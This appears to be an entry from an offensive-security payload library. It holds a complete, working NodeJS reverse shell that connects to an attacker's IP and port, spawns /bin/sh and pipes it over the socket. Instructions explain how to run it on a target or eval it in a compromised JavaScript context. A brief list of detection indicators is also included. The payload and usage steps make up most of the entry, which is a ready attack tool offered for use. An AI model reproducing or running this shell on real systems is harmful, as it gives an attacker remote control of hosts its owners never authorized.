---
type: code
language: javascript
verified: true
created_at: '2023-10-01T00:00:00+00:00'
updated_at: '2023-10-01T00:00:00+00:00'
platforms:
  - Linux
tags:
  - reverse-shell
  - nodejs
  - payload
validated: true
---

# NodeJS-Net-Socket-Reverse-Shell

## Code

```javascript
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(4242, "10.0.0.1", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application from crashing
})();
```

## Description

This self-invoking JavaScript function creates a TCP reverse shell using NodeJS's built-in 'net' module for socket connection and 'child_process' to spawn a /bin/sh shell. It pipes the shell's stdin/stdout/stderr to the socket, allowing full interactive access without relying on external tools like netcat.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| 10.0.0.1 | Attacker's IP address (replace in connect call) | 192.168.1.100 |
| 4242 | Attacker's listening port (replace in connect call) | 4444 |

## Usage

Save the code to a file (e.g., shell.js) on the target and execute with `node shell.js`. Alternatively, paste into a NodeJS REPL or eval in a compromised JS context. Ensure a listener (e.g., netcat) is running on the attacker side beforehand. Ideal for targets with NodeJS but no netcat.

## Detection

- NodeJS process spawning child shells or loading 'net'/'child_process' modules unexpectedly.
- Outbound TCP connections from NodeJS to attacker IPs on non-standard ports.
- File system artifacts like temporary .js files with socket code.

## Related

- [[procedures/Establish-NodeJS-Reverse-Shell]]
- [[tools/NodeJS]]
